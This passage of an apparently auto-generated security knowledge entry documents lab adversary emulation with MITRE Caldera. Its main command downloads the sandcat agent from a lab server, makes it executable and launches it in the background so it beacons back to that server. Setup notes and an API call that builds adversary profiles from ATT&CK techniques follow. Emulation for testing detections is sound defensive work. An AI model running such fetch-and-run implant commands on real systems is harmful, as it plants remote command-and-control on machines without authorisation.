---
id: unit-corpus-injection-on-the-target-from-the-lab-network
kind: what
title: "corpus_injection \u2014 on the target, from the lab network"
sources:
- type: doc
  path: docs/security/corpus_injection.md
  commit: 05e42ec2
  section: on the target, from the lab network
last_generated_commit: 05e42ec2
confidence: high
tags:
- docs
created_at: 1784946220.586659
updated_at: 1784946220.586659
---

curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \
     http://10.10.11.60:8888/file/download -o /tmp/p5agent
chmod +x /tmp/p5agent && setsid /tmp/p5agent -server http://10.10.11.60:8888 -group red &
```

Setup notes: Caldera compiles the sandcat agent on demand, so the **Go toolchain
must be installed on the Caldera host** — without it the download returns a
55-byte error string instead of a binary. The Magma web UI needs **Node 20.19+**;
Debian 12's Node 18 fails the Vite build.

Build profiles from ATT&CK technique IDs rather than picking stock adversaries,
so the emulation targets techniques the detection library covers:

```bash
curl -s -H "KEY: $CALDERA_API_KEY" -H "Content-Type: application/json" \
  -X POST http://10.10.11.60:8888/api/v2/adversaries \
  -d '{"name":"Portal5 Linux Discovery","atomic_ordering":["<ability-id>", "..."]}'
```
